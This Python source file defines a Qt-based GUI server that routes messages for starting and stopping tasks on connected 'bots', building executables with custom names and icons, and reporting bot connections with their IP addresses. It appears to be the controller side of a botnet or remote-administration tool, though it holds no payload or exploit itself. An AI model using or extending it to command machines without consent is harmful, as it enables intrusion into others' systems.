from qasync import asyncSlot
from qtpy.QtCore import Signal
from QtPyNetwork.server import QThreadedServer

import socket

from models import Task, Info
from core.crypto import generate_key


class GUIServer(QThreadedServer):
    """GUI server."""
    stop_task = Signal(int, int)
    force_start_task = Signal(int, int)
    start_task = Signal(int, str, dict, int)
    get_tasks = Signal(int)

    build_start = Signal(int, str, str, list)
    build_stop = Signal(int)
    build_options = Signal(int)

    get_config = Signal(int)
    save_config = Signal(int, dict)

    restart_app = Signal()
    close_app = Signal()

    setup_options = Signal(int)

    def __init__(self):
        super(GUIServer, self).__init__()

    @asyncSlot()
    async def start_setup(self):
        ip = socket.gethostbyname(socket.gethostname())
        with socket.socket() as s:
            s.bind(('', 0))
            port = s.getsockname()[1]
        key = generate_key()
        return ip, port, key

    @asyncSlot(int, dict)
    async def on_message(self, device_id: int, message: dict):
        event_type = message.get("event_type")
        event = message.get("event")
        if event_type == "task":
            if event == "options":
                self.get_tasks.emit(device_id)

            elif event == "stop":
                self.stop_task.emit(message.get("bot_id"), message.get("task_id"))

            elif event == "start":
                self.start_task.emit(message.get("bot_id"), message.get("task"),
                                     message.get("kwargs"), message.get("user_activity"))
            elif event == "force_start":
                self.force_start_task.emit(message.get("bot_id"), message.get("task_id"))

        elif event_type == "build":
            if event == "start":
                self.build_start.emit(device_id, message.get("name"), message.get("icon"), message.get("generators"))
            elif event == "options":
                self.build_options.emit(device_id)
            elif event == "stop":
                self.build_stop.emit(device_id)

        elif event_type == "config":
            if event == "get":
                self.get_config.emit(device_id)
            elif event == "save":
                self.save_config.emit(device_id, message.get("config"))

        elif event_type == "app":
            if event == "restart":
                self.restart_app.emit()
            elif event == "close":
                self.close_app.emit()

        elif event_type == "setup":
            if event == "options":
                self.setup_options.emit(device_id)

    @asyncSlot(int, dict)
    async def on_setup_options(self, client_id, options):
        self.write(client_id, {"event_type": "setup",
                               "event": "options",
                               "options": options})

    @asyncSlot(int)
    async def on_connected_no_config(self, client_id):
        self.write(client_id, {"event_type": "app",
                               "event": "setup"})

    @asyncSlot(int, str)
    async def on_config_error(self, client_id, error):
        self.write(client_id, {"event_type": "config",
                               "event": "error",
                               "error": error})

    @asyncSlot(int)
    async def on_config_saved(self, client_id):
        self.write(client_id, {"event_type": "config",
                               "event": "saved"})

    @asyncSlot(int, dict)
    async def on_config_get(self, client_id, config):
        self.write(client_id, {"event_type": "config",
                               "event": "get",
                               "config": config})

    @asyncSlot(int, str)
    async def on_config_validation_error(self, client_id, error):
        self.write(client_id, {"event_type": "config",
                               "event": "validate_error",
                               "error": error})

    @asyncSlot(int, list)
    async def on_get_tasks(self, client_id, tasks):
        self.write(client_id, {"event_type": "task",
                               "event": "options",
                               "options": {"tasks": tasks}})

    @asyncSlot(int, str, str)
    async def on_generator_progress(self, client_id, generator_name, progress):
        self.write(client_id, {"event_type": "build",
                               "event": "progress",
                               "generator_name": generator_name,
                               "progress": progress})

    @asyncSlot(int, str)
    async def on_generator_started(self, client_id, generator_name):
        self.write(client_id, {"event_type": "build",
                               "event": "started",
                               "generator_name": generator_name})

    @asyncSlot(int, str, int)
    async def on_generator_finished(self, client_id, generator_name, exit_code):
        self.write(client_id, {"event_type": "build",
                               "event": "generator_finished",
                               "generator_name": generator_name,
                               "exit_code": exit_code})

    @asyncSlot(int, dict)
    async def on_build_options(self, client_id, options):
        self.write(client_id, {"event_type": "build",
                               "event": "options",
                               "options": options})

    @asyncSlot(int)
    async def on_build_finished(self, client_id):
        self.write(client_id, {"event_type": "build",
                               "event": "build_finished"})

    @asyncSlot(int)
    async def on_build_stopped(self, client_id):
        self.write(client_id, {"event_type": "build",
                               "event": "stopped"})

    @asyncSlot(int, str)
    async def on_build_error(self, client_id, error):
        self.write(client_id, {"event_type": "build",
                               "event": "error",
                               "error": error})

    @asyncSlot(int, str, int)
    async def on_bot_connected(self, bot_id, ip, port):
        self.writeAll({"event_type": "connection",
                       "event": "connected",
                       "bot_id": bot_id,
                       "ip": ip,
                       "port": port})

    @asyncSlot(int)
    async def on_bot_disconnected(self, bot_id):
        self.writeAll({"event_type": "connection",
                       "event": "disconnected",
                       "bot_id": bot_id})

    @asyncSlot(Task)
    async def on_bot_task(self, task):
        self.writeAll(task.serialize())

    @asyncSlot(Info)
    async def on_bot_info(self, info):
        self.writeAll(info.serialize())
